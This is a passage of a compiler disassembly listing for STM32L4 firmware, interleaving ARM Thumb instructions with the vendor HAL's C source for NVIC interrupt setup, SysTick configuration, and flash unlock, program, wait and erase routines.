 800158a:	f7ff ff29 	bl	80013e0 <__NVIC_SetPriorityGrouping>
}
 800158e:	bf00      	nop
 8001590:	3708      	adds	r7, #8
 8001592:	46bd      	mov	sp, r7
 8001594:	bd80      	pop	{r7, pc}

08001596 <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 8001596:	b580      	push	{r7, lr}
 8001598:	b086      	sub	sp, #24
 800159a:	af00      	add	r7, sp, #0
 800159c:	4603      	mov	r3, r0
 800159e:	60b9      	str	r1, [r7, #8]
 80015a0:	607a      	str	r2, [r7, #4]
 80015a2:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 80015a4:	2300      	movs	r3, #0
 80015a6:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 80015a8:	f7ff ff3e 	bl	8001428 <__NVIC_GetPriorityGrouping>
 80015ac:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 80015ae:	687a      	ldr	r2, [r7, #4]
 80015b0:	68b9      	ldr	r1, [r7, #8]
 80015b2:	6978      	ldr	r0, [r7, #20]
 80015b4:	f7ff ff8e 	bl	80014d4 <NVIC_EncodePriority>
 80015b8:	4602      	mov	r2, r0
 80015ba:	f997 300f 	ldrsb.w	r3, [r7, #15]
 80015be:	4611      	mov	r1, r2
 80015c0:	4618      	mov	r0, r3
 80015c2:	f7ff ff5d 	bl	8001480 <__NVIC_SetPriority>
}
 80015c6:	bf00      	nop
 80015c8:	3718      	adds	r7, #24
 80015ca:	46bd      	mov	sp, r7
 80015cc:	bd80      	pop	{r7, pc}

080015ce <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80015ce:	b580      	push	{r7, lr}
 80015d0:	b082      	sub	sp, #8
 80015d2:	af00      	add	r7, sp, #0
 80015d4:	4603      	mov	r3, r0
 80015d6:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 80015d8:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80015dc:	4618      	mov	r0, r3
 80015de:	f7ff ff31 	bl	8001444 <__NVIC_EnableIRQ>
}
 80015e2:	bf00      	nop
 80015e4:	3708      	adds	r7, #8
 80015e6:	46bd      	mov	sp, r7
 80015e8:	bd80      	pop	{r7, pc}

080015ea <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 80015ea:	b580      	push	{r7, lr}
 80015ec:	b082      	sub	sp, #8
 80015ee:	af00      	add	r7, sp, #0
 80015f0:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 80015f2:	6878      	ldr	r0, [r7, #4]
 80015f4:	f7ff ffa2 	bl	800153c <SysTick_Config>
 80015f8:	4603      	mov	r3, r0
}
 80015fa:	4618      	mov	r0, r3
 80015fc:	3708      	adds	r7, #8
 80015fe:	46bd      	mov	sp, r7
 8001600:	bd80      	pop	{r7, pc}
	...

08001604 <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 8001604:	b580      	push	{r7, lr}
 8001606:	b086      	sub	sp, #24
 8001608:	af00      	add	r7, sp, #0
 800160a:	60f8      	str	r0, [r7, #12]
 800160c:	60b9      	str	r1, [r7, #8]
 800160e:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 8001612:	2300      	movs	r3, #0
 8001614:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 8001616:	4b2f      	ldr	r3, [pc, #188]	; (80016d4 <HAL_FLASH_Program+0xd0>)
 8001618:	781b      	ldrb	r3, [r3, #0]
 800161a:	2b01      	cmp	r3, #1
 800161c:	d101      	bne.n	8001622 <HAL_FLASH_Program+0x1e>
 800161e:	2302      	movs	r3, #2
 8001620:	e053      	b.n	80016ca <HAL_FLASH_Program+0xc6>
 8001622:	4b2c      	ldr	r3, [pc, #176]	; (80016d4 <HAL_FLASH_Program+0xd0>)
 8001624:	2201      	movs	r2, #1
 8001626:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001628:	f24c 3050 	movw	r0, #50000	; 0xc350
 800162c:	f000 f888 	bl	8001740 <FLASH_WaitForLastOperation>
 8001630:	4603      	mov	r3, r0
 8001632:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 8001634:	7dfb      	ldrb	r3, [r7, #23]
 8001636:	2b00      	cmp	r3, #0
 8001638:	d143      	bne.n	80016c2 <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 800163a:	4b26      	ldr	r3, [pc, #152]	; (80016d4 <HAL_FLASH_Program+0xd0>)
 800163c:	2200      	movs	r2, #0
 800163e:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001640:	4b25      	ldr	r3, [pc, #148]	; (80016d8 <HAL_FLASH_Program+0xd4>)
 8001642:	681b      	ldr	r3, [r3, #0]
 8001644:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001648:	2b00      	cmp	r3, #0
 800164a:	d009      	beq.n	8001660 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 800164c:	4b22      	ldr	r3, [pc, #136]	; (80016d8 <HAL_FLASH_Program+0xd4>)
 800164e:	681b      	ldr	r3, [r3, #0]
 8001650:	4a21      	ldr	r2, [pc, #132]	; (80016d8 <HAL_FLASH_Program+0xd4>)
 8001652:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001656:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001658:	4b1e      	ldr	r3, [pc, #120]	; (80016d4 <HAL_FLASH_Program+0xd0>)
 800165a:	2202      	movs	r2, #2
 800165c:	771a      	strb	r2, [r3, #28]
 800165e:	e002      	b.n	8001666 <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001660:	4b1c      	ldr	r3, [pc, #112]	; (80016d4 <HAL_FLASH_Program+0xd0>)
 8001662:	2200      	movs	r2, #0
 8001664:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 8001666:	68fb      	ldr	r3, [r7, #12]
 8001668:	2b00      	cmp	r3, #0
 800166a:	d107      	bne.n	800167c <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 800166c:	e9d7 2300 	ldrd	r2, r3, [r7]
 8001670:	68b8      	ldr	r0, [r7, #8]
 8001672:	f000 f8bd 	bl	80017f0 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 8001676:	2301      	movs	r3, #1
 8001678:	613b      	str	r3, [r7, #16]
 800167a:	e010      	b.n	800169e <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 800167c:	68fb      	ldr	r3, [r7, #12]
 800167e:	2b01      	cmp	r3, #1
 8001680:	d002      	beq.n	8001688 <HAL_FLASH_Program+0x84>
 8001682:	68fb      	ldr	r3, [r7, #12]
 8001684:	2b02      	cmp	r3, #2
 8001686:	d10a      	bne.n	800169e <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001688:	683b      	ldr	r3, [r7, #0]
 800168a:	4619      	mov	r1, r3
 800168c:	68b8      	ldr	r0, [r7, #8]
 800168e:	f000 f8d5 	bl	800183c <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 8001692:	68fb      	ldr	r3, [r7, #12]
 8001694:	2b02      	cmp	r3, #2
 8001696:	d102      	bne.n	800169e <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001698:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 800169c:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800169e:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016a2:	f000 f84d 	bl	8001740 <FLASH_WaitForLastOperation>
 80016a6:	4603      	mov	r3, r0
 80016a8:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 80016aa:	693b      	ldr	r3, [r7, #16]
 80016ac:	2b00      	cmp	r3, #0
 80016ae:	d006      	beq.n	80016be <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 80016b0:	4b09      	ldr	r3, [pc, #36]	; (80016d8 <HAL_FLASH_Program+0xd4>)
 80016b2:	695a      	ldr	r2, [r3, #20]
 80016b4:	693b      	ldr	r3, [r7, #16]
 80016b6:	43db      	mvns	r3, r3
 80016b8:	4907      	ldr	r1, [pc, #28]	; (80016d8 <HAL_FLASH_Program+0xd4>)
 80016ba:	4013      	ands	r3, r2
 80016bc:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80016be:	f000 f9cf 	bl	8001a60 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80016c2:	4b04      	ldr	r3, [pc, #16]	; (80016d4 <HAL_FLASH_Program+0xd0>)
 80016c4:	2200      	movs	r2, #0
 80016c6:	701a      	strb	r2, [r3, #0]

  return status;
 80016c8:	7dfb      	ldrb	r3, [r7, #23]
}
 80016ca:	4618      	mov	r0, r3
 80016cc:	3718      	adds	r7, #24
 80016ce:	46bd      	mov	sp, r7
 80016d0:	bd80      	pop	{r7, pc}
 80016d2:	bf00      	nop
 80016d4:	2000000c 	.word	0x2000000c
 80016d8:	40022000 	.word	0x40022000

080016dc <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 80016dc:	b480      	push	{r7}
 80016de:	b083      	sub	sp, #12
 80016e0:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 80016e2:	2300      	movs	r3, #0
 80016e4:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80016e6:	4b0b      	ldr	r3, [pc, #44]	; (8001714 <HAL_FLASH_Unlock+0x38>)
 80016e8:	695b      	ldr	r3, [r3, #20]
 80016ea:	2b00      	cmp	r3, #0
 80016ec:	da0b      	bge.n	8001706 <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 80016ee:	4b09      	ldr	r3, [pc, #36]	; (8001714 <HAL_FLASH_Unlock+0x38>)
 80016f0:	4a09      	ldr	r2, [pc, #36]	; (8001718 <HAL_FLASH_Unlock+0x3c>)
 80016f2:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 80016f4:	4b07      	ldr	r3, [pc, #28]	; (8001714 <HAL_FLASH_Unlock+0x38>)
 80016f6:	4a09      	ldr	r2, [pc, #36]	; (800171c <HAL_FLASH_Unlock+0x40>)
 80016f8:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80016fa:	4b06      	ldr	r3, [pc, #24]	; (8001714 <HAL_FLASH_Unlock+0x38>)
 80016fc:	695b      	ldr	r3, [r3, #20]
 80016fe:	2b00      	cmp	r3, #0
 8001700:	da01      	bge.n	8001706 <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 8001702:	2301      	movs	r3, #1
 8001704:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 8001706:	79fb      	ldrb	r3, [r7, #7]
}
 8001708:	4618      	mov	r0, r3
 800170a:	370c      	adds	r7, #12
 800170c:	46bd      	mov	sp, r7
 800170e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001712:	4770      	bx	lr
 8001714:	40022000 	.word	0x40022000
 8001718:	45670123 	.word	0x45670123
 800171c:	cdef89ab 	.word	0xcdef89ab

08001720 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 8001720:	b480      	push	{r7}
 8001722:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 8001724:	4b05      	ldr	r3, [pc, #20]	; (800173c <HAL_FLASH_Lock+0x1c>)
 8001726:	695b      	ldr	r3, [r3, #20]
 8001728:	4a04      	ldr	r2, [pc, #16]	; (800173c <HAL_FLASH_Lock+0x1c>)
 800172a:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 800172e:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 8001730:	2300      	movs	r3, #0
}
 8001732:	4618      	mov	r0, r3
 8001734:	46bd      	mov	sp, r7
 8001736:	f85d 7b04 	ldr.w	r7, [sp], #4
 800173a:	4770      	bx	lr
 800173c:	40022000 	.word	0x40022000

08001740 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 8001740:	b580      	push	{r7, lr}
 8001742:	b084      	sub	sp, #16
 8001744:	af00      	add	r7, sp, #0
 8001746:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 8001748:	f7ff fe1a 	bl	8001380 <HAL_GetTick>
 800174c:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 800174e:	e00d      	b.n	800176c <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 8001750:	687b      	ldr	r3, [r7, #4]
 8001752:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001756:	d009      	beq.n	800176c <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 8001758:	f7ff fe12 	bl	8001380 <HAL_GetTick>
 800175c:	4602      	mov	r2, r0
 800175e:	68fb      	ldr	r3, [r7, #12]
 8001760:	1ad3      	subs	r3, r2, r3
 8001762:	687a      	ldr	r2, [r7, #4]
 8001764:	429a      	cmp	r2, r3
 8001766:	d801      	bhi.n	800176c <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 8001768:	2303      	movs	r3, #3
 800176a:	e036      	b.n	80017da <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 800176c:	4b1d      	ldr	r3, [pc, #116]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 800176e:	691b      	ldr	r3, [r3, #16]
 8001770:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001774:	2b00      	cmp	r3, #0
 8001776:	d1eb      	bne.n	8001750 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 8001778:	4b1a      	ldr	r3, [pc, #104]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 800177a:	691a      	ldr	r2, [r3, #16]
 800177c:	4b1a      	ldr	r3, [pc, #104]	; (80017e8 <FLASH_WaitForLastOperation+0xa8>)
 800177e:	4013      	ands	r3, r2
 8001780:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 8001782:	68bb      	ldr	r3, [r7, #8]
 8001784:	2b00      	cmp	r3, #0
 8001786:	d01e      	beq.n	80017c6 <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001788:	4b18      	ldr	r3, [pc, #96]	; (80017ec <FLASH_WaitForLastOperation+0xac>)
 800178a:	685a      	ldr	r2, [r3, #4]
 800178c:	68bb      	ldr	r3, [r7, #8]
 800178e:	4313      	orrs	r3, r2
 8001790:	4a16      	ldr	r2, [pc, #88]	; (80017ec <FLASH_WaitForLastOperation+0xac>)
 8001792:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 8001794:	68bb      	ldr	r3, [r7, #8]
 8001796:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 800179a:	2b00      	cmp	r3, #0
 800179c:	d007      	beq.n	80017ae <FLASH_WaitForLastOperation+0x6e>
 800179e:	4b11      	ldr	r3, [pc, #68]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 80017a0:	699a      	ldr	r2, [r3, #24]
 80017a2:	68bb      	ldr	r3, [r7, #8]
 80017a4:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80017a8:	490e      	ldr	r1, [pc, #56]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 80017aa:	4313      	orrs	r3, r2
 80017ac:	618b      	str	r3, [r1, #24]
 80017ae:	68bb      	ldr	r3, [r7, #8]
 80017b0:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80017b4:	2b00      	cmp	r3, #0
 80017b6:	d004      	beq.n	80017c2 <FLASH_WaitForLastOperation+0x82>
 80017b8:	4a0a      	ldr	r2, [pc, #40]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 80017ba:	68bb      	ldr	r3, [r7, #8]
 80017bc:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80017c0:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 80017c2:	2301      	movs	r3, #1
 80017c4:	e009      	b.n	80017da <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 80017c6:	4b07      	ldr	r3, [pc, #28]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 80017c8:	691b      	ldr	r3, [r3, #16]
 80017ca:	f003 0301 	and.w	r3, r3, #1
 80017ce:	2b00      	cmp	r3, #0
 80017d0:	d002      	beq.n	80017d8 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 80017d2:	4b04      	ldr	r3, [pc, #16]	; (80017e4 <FLASH_WaitForLastOperation+0xa4>)
 80017d4:	2201      	movs	r2, #1
 80017d6:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 80017d8:	2300      	movs	r3, #0
}
 80017da:	4618      	mov	r0, r3
 80017dc:	3710      	adds	r7, #16
 80017de:	46bd      	mov	sp, r7
 80017e0:	bd80      	pop	{r7, pc}
 80017e2:	bf00      	nop
 80017e4:	40022000 	.word	0x40022000
 80017e8:	0002c3fa 	.word	0x0002c3fa
 80017ec:	2000000c 	.word	0x2000000c

080017f0 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 80017f0:	b480      	push	{r7}
 80017f2:	b085      	sub	sp, #20
 80017f4:	af00      	add	r7, sp, #0
 80017f6:	60f8      	str	r0, [r7, #12]
 80017f8:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 80017fc:	4b0e      	ldr	r3, [pc, #56]	; (8001838 <FLASH_Program_DoubleWord+0x48>)
 80017fe:	695b      	ldr	r3, [r3, #20]
 8001800:	4a0d      	ldr	r2, [pc, #52]	; (8001838 <FLASH_Program_DoubleWord+0x48>)
 8001802:	f043 0301 	orr.w	r3, r3, #1
 8001806:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001808:	68fb      	ldr	r3, [r7, #12]
 800180a:	683a      	ldr	r2, [r7, #0]
 800180c:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 800180e:	f3bf 8f6f 	isb	sy
}
 8001812:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 8001814:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001818:	f04f 0200 	mov.w	r2, #0
 800181c:	f04f 0300 	mov.w	r3, #0
 8001820:	000a      	movs	r2, r1
 8001822:	2300      	movs	r3, #0
 8001824:	68f9      	ldr	r1, [r7, #12]
 8001826:	3104      	adds	r1, #4
 8001828:	4613      	mov	r3, r2
 800182a:	600b      	str	r3, [r1, #0]
}
 800182c:	bf00      	nop
 800182e:	3714      	adds	r7, #20
 8001830:	46bd      	mov	sp, r7
 8001832:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001836:	4770      	bx	lr
 8001838:	40022000 	.word	0x40022000

0800183c <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 800183c:	b480      	push	{r7}
 800183e:	b089      	sub	sp, #36	; 0x24
 8001840:	af00      	add	r7, sp, #0
 8001842:	6078      	str	r0, [r7, #4]
 8001844:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 8001846:	2340      	movs	r3, #64	; 0x40
 8001848:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 800184a:	687b      	ldr	r3, [r7, #4]
 800184c:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 800184e:	683b      	ldr	r3, [r7, #0]
 8001850:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 8001852:	4b14      	ldr	r3, [pc, #80]	; (80018a4 <FLASH_Program_Fast+0x68>)
 8001854:	695b      	ldr	r3, [r3, #20]
 8001856:	4a13      	ldr	r2, [pc, #76]	; (80018a4 <FLASH_Program_Fast+0x68>)
 8001858:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 800185c:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 800185e:	f3ef 8310 	mrs	r3, PRIMASK
 8001862:	60fb      	str	r3, [r7, #12]
  return(result);
 8001864:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 8001866:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 8001868:	b672      	cpsid	i
}
 800186a:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 800186c:	697b      	ldr	r3, [r7, #20]
 800186e:	681a      	ldr	r2, [r3, #0]
 8001870:	69bb      	ldr	r3, [r7, #24]
 8001872:	601a      	str	r2, [r3, #0]
    dest_addr++;
 8001874:	69bb      	ldr	r3, [r7, #24]
 8001876:	3304      	adds	r3, #4
 8001878:	61bb      	str	r3, [r7, #24]
    src_addr++;
 800187a:	697b      	ldr	r3, [r7, #20]
 800187c:	3304      	adds	r3, #4
 800187e:	617b      	str	r3, [r7, #20]
    row_index--;
 8001880:	7ffb      	ldrb	r3, [r7, #31]
 8001882:	3b01      	subs	r3, #1
 8001884:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 8001886:	7ffb      	ldrb	r3, [r7, #31]
 8001888:	2b00      	cmp	r3, #0
 800188a:	d1ef      	bne.n	800186c <FLASH_Program_Fast+0x30>
 800188c:	693b      	ldr	r3, [r7, #16]
 800188e:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001890:	68bb      	ldr	r3, [r7, #8]
 8001892:	f383 8810 	msr	PRIMASK, r3
}
 8001896:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001898:	bf00      	nop
 800189a:	3724      	adds	r7, #36	; 0x24
 800189c:	46bd      	mov	sp, r7
 800189e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018a2:	4770      	bx	lr
 80018a4:	40022000 	.word	0x40022000

080018a8 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 80018a8:	b580      	push	{r7, lr}
 80018aa:	b084      	sub	sp, #16
 80018ac:	af00      	add	r7, sp, #0
 80018ae:	6078      	str	r0, [r7, #4]
 80018b0:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 80018b2:	4b48      	ldr	r3, [pc, #288]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 80018b4:	781b      	ldrb	r3, [r3, #0]
 80018b6:	2b01      	cmp	r3, #1
 80018b8:	d101      	bne.n	80018be <HAL_FLASHEx_Erase+0x16>
 80018ba:	2302      	movs	r3, #2
 80018bc:	e085      	b.n	80019ca <HAL_FLASHEx_Erase+0x122>
 80018be:	4b45      	ldr	r3, [pc, #276]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 80018c0:	2201      	movs	r2, #1
 80018c2:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80018c4:	f24c 3050 	movw	r0, #50000	; 0xc350
 80018c8:	f7ff ff3a 	bl	8001740 <FLASH_WaitForLastOperation>
 80018cc:	4603      	mov	r3, r0
 80018ce:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 80018d0:	7bfb      	ldrb	r3, [r7, #15]
 80018d2:	2b00      	cmp	r3, #0
 80018d4:	d175      	bne.n	80019c2 <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80018d6:	4b3f      	ldr	r3, [pc, #252]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 80018d8:	2200      	movs	r2, #0
 80018da:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 80018dc:	4b3e      	ldr	r3, [pc, #248]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 80018de:	681b      	ldr	r3, [r3, #0]
 80018e0:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80018e4:	2b00      	cmp	r3, #0
 80018e6:	d013      	beq.n	8001910 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80018e8:	4b3b      	ldr	r3, [pc, #236]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 80018ea:	681b      	ldr	r3, [r3, #0]
 80018ec:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80018f0:	2b00      	cmp	r3, #0
 80018f2:	d009      	beq.n	8001908 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
